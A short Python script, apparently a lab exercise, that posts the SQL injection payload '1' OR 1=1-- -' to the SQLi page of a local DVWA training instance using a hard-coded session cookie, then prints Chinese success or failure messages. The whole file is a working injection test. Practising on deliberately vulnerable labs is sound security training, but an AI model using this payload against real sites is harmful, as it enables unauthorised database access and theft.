import requests

url = "http://localhost/dvwa/vulnerabilities/sqli/"
cookies = {
    "PHPSESSID": "8e6a9c2d0c082f51ddd781cbfc448a3f",
    "security": "low"
}
payload = {
    "id": "1' OR 1=1-- -",
    "Submit": "Submit"
}

r = requests.post(url, data=payload, cookies=cookies)

if "admin" in r.text:
    print("[+] 注入成功！")
else:
    print("[-] 注入失败")

print("状态码:", r.status_code)
print("内容长度:", len(r.text))
